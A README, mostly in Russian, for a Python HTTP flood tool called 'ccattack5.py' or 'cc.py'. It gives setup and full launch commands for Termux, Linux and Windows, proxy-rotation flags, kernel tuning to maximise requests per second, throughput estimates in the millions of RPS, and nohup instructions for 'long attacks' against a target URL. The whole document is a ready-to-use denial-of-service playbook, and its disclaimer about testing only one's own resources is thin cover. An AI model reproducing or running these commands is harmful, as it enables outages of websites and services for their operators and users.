pip3 install requests pysocks

💡 Напоминания
The author is not responsible for his actions, use it only for his server.
⚠️⚠️⚠️⚠️. Автор не несёт ответственность за нарушение закона и правил на свои страх и риск ☣️ 
1. Тестируй только свои ресурсы или с письменного разрешения.🪪

Версия Что добавили
3.9.9 Базовая версия: баннер, локализация, чекер
4.0.0 Интерактивный CLI + Windows .bat
4.0.1 Фикс ANSI на Windows (SetConsoleMode)
4.0.2 Обновление источников прокси 2026 (24 живых)
4.1.0 HTTP/2, WebSocket, OVH, RapidRest, плавность
5.0.0 HP Edition: multiprocessing, 1M–5M RPS.

🎯 Что теперь в скрипте

· ⚡ Multiprocessing — N процессов × M потоков
· 🔥 Fast RNG — без GIL-конкуренции
· 🚀 Pipeline 64 + KA 10000 — максимум на сокет
· 💾 Буферы 4 MB + chunked send
· 🎨 Windows ANSI fix — цвета работают
· 🌍 Локализация RU/EN
· 🎛️ Интерактивный CLI — [*] Target [default]:
· 🖱️ Windows .bat — двойной клик
· 🔍 Быстрый чекер — TOP-N живых
· 📦 24 живых источника прокси 2026
· 🪄 HTTP/2, WebSocket, OVH, RapidRest


🚀 Как запустить

Просто:

```cmd
python ccattack5.py
&
python3 ccattack5.py -h
```

В интерактивном режиме спросит параметры.

Быстро с флагами:

```cmd
python ccattack5.py -url http://target.com -v 5 -t 200 -s 120 ^
    -pipeline 64 -keepalive 10000 -down -check -top 2000
```

---

⚙️ Рекомендации для максимального RPS

Железо -t (потоки на процесс) -pipeline -keepalive -top
8 ядер / 16 ГБ / 1 Гбит 200 64 10000 2000
16 ядер / 32 ГБ / 10 Гбит 300 64 20000 5000
Termux (мобильный) 50 32 3000 300

Формула итогового RPS:

```
RPS ≈ CPU_cores × threads_per_proc × pipeline × (1000 / ping_ms)
```

Пример для 8 ядер:

```
8 × 200 × 64 × (1000/100) = 1 024 000 RPS
```

---

⚠️ Важно

1. Windows: mp.freeze_support() уже добавлен — multiprocessing заработает из-под .bat.
2. Ctrl+C: работает — процессы аккуратно останавливаются.
3. Канал: для 1M+ RPS нужен гигабит+ и правильные прокси.
4. Прокси: чем их больше (-top 2000+), тем стабильнее RPS.
5. Не переусердствуй: 1M+ RPS могут завалить твой домашний роутер или канал.

Тестируй только на своих ресурсах.
🚀 Краткие примеры запуска: Termux / Linux / Windows

📱 Termux (Android)

Установка

```bash
pkg update && pkg upgrade -y
pkg install python -y
pip install requests pysocks
```

Запуск

Интерактивный режим (пошаговый ввод):

```bash
python cc.py
```

Быстрый запуск:

```bash
python cc.py -url http://target.com -v 5 -t 50 -s 120 \
    -pipeline 32 -keepalive 3000 -down -check -top 300
```

Рекомендуемые параметры для Termux:

```bash
python cc.py -url http://target.com -v 5 -t 50 -s 60 \
    -pipeline 32 -keepalive 3000 -top 300
```

· -t 50 — не более 50 потоков на процесс (лимит Android)
· -pipeline 32 — компенсирует малое число потоков
· Ожидаемый RPS: 50 000–150 000

---

🐧 Linux (Ubuntu / Debian / VPS)

Установка

```bash
sudo apt update
sudo apt install python3 python3-pip -y
pip3 install requests pysocks
```

Подготовка системы (только от root)

```bash
# Увеличить лимиты
ulimit -n 100000
ulimit -u 65535

# Сетевые твики
sudo sysctl -w net.ipv4.tcp_fin_timeout=15
sudo sysctl -w net.ipv4.tcp_tw_reuse=1
sudo sysctl -w net.core.somaxconn=65535
sudo sysctl -w net.ipv4.ip_local_port_range="1024 65535"
```

Запуск

Интерактивный режим:

```bash
python3 cc.py
```

Быстрый запуск (HP Edition):

```bash
python3 cc.py -url http://target.com -v 5 -t 300 -s 300 \
    -pipeline 64 -keepalive 10000 -down -check -top 5000
```

Максимум для 16-ядерного VPS:

```bash
python3 cc.py -url http://target.com -v 5 -t 400 -s 300 \
    -pipeline 64 -keepalive 20000 -down -check -top 5000
```

· Ожидаемый RPS: 3 000 000–8 000 000

Запуск в фоне (nohup):

```bash
nohup python3 cc.py -url http://target.com -t 300 -s 600 \
    > attack.log 2>&1 &
```

· Проверить: tail -f attack.log
· Остановить: pkill -f cc.py

---

🪟 Windows 10 / 11

Установка

1. Скачай Python 3.10+ с python.org
2. При установке отметь галку "Add Python to PATH"
3. Открой cmd и выполни:

```cmd
python -m pip install requests pysocks
```

Запуск

Способ A — двойной клик по start_cc.bat

· Откроется окно с интерактивным опросом
· Всё цветное (ANSI поддерживается на Win10 1511+)

Способ B — из cmd:

```cmd
cd C:\cc
python cc.py
```

Способ C — быстрый запуск с флагами:

```cmd
python cc.py -url http://target.com -v 5 -t 200 -s 300 ^
    -pipeline 64 -keepalive 10000 -down -check -top 2000
```

Максимум для 8-ядерного ПК:

```cmd
python cc.py -url http://target.com -v 5 -t 250 -s 300 ^
    -pipeline 64 -keepalive 10000 -down -check -top 2000
```

· Ожидаемый RPS: 1 500 000–2 500 000

Если цвета не работают (старая Windows)

```cmd
reg add "HKCU\Console" /v VirtualTerminalLevel /t REG_DWORD /d 1 /f
```

Закрой и открой cmd заново.

---

📊 Сводная таблица параметров

Система -t (потоков) -pipeline -keepalive -top Ожидаемый RPS
Termux 50 32 3000 300 50k–150k
Linux 8 ядер 200 64 10000 2000 1.5M–3M
Linux 16 ядер 300 64 20000 5000 3M–8M
Windows 8 ядер 250 64 10000 2000 1.5M–2.5M

---

🎯 Самые мощные команды по системам

📱 Termux

```bash
python cc.py -url http://target.com -v 5 -t 50 -s 300 \
    -pipeline 64 -keepalive 5000 -down -check -top 300
```

🐧 Linux (16 ядер)

```bash
python3 cc.py -url http://target.com -v 5 -t 400 -s 300 \
    -pipeline 64 -keepalive 20000 -down -check -top 5000
```

🪟 Windows (8+ ядер)

```cmd
python cc.py -url http://target.com -v 5 -t 250 -s 300 ^
    -pipeline 64 -keepalive 10000 -down -check -top 2000
```

---

⚙️ Расшифровка флагов

Флаг Что значит
-url Целевой URL
-v Тип прокси: 4 / 5 / http
-t Потоков на процесс
-s Длительность в секундах
-pipeline Запросов в одном send (1–128)
-keepalive Запросов на один сокет (1–100000)
-down Скачать свежие прокси
-check Проверить прокси перед атакой
-check-to Таймаут проверки (сек)
-check-w Воркеров проверки
-top Оставить TOP-N лучших прокси
-f Файл прокси (по умолчанию proxy.txt)

---

🧪 Проверка перед запуском

Termux

```bash
python3 -c "import requests, socks; print('OK')"
```

Linux

```bash
python3 -c "import requests, socks; print('OK')"
nproc  # показать число ядер
```

Windows

```cmd
python -c "import requests, socks; print('OK')"
python -c "import os; print(os.cpu_count(), 'cores')"
```

---

💡 Полезные советы

Ситуация Что делать
Мало прокси -down + -check + -top 5000
Прокси быстро мрут Уменьши -top до 500
RPS низкий Увеличь -pipeline до 64, -keepalive до 10000
CPU 100% Уменьши -t на 50
Много ошибок -check-to 1 — жёсткая проверка прокси
Windows: цвета не работают reg add "HKCU\Console" /v VirtualTerminalLevel /t REG_DWORD /d 1 /f + перезапуск cmd
Termux падает -t 50 максимум, стек 256 KB уже стоит
Linux: too many open files ulimit -n 100000

---

🎬 Быстрый старт (одна команда)

Termux / Linux

```bash
python3 ccattack5.py -url http://target.com -v 5 -t 100 -s 120 \
    -pipeline 64 -keepalive 10000 -down -check -top 1000
```

Windows

```cmd
python ccattack5.py -url http://target.com -v 5 -t 100 -s 120 ^
    -pipeline 64 -keepalive 10000 -down -check -top 1000
```

Если не знаешь параметры — просто запусти python cc.py без флагов → откроется пошаговый опрос с подсказками.

---

⚠️ Напоминание

· Тестируй только свои ресурсы или с письменного разрешения
· 1M+ RPS может уронить домашний роутер
· Termux: следи за батареей (за 20 минут садится)
· Linux: nohup для долгих атак
· Windows: закрой Chrome/Discord для максимального RPS

Удачи! 🎯
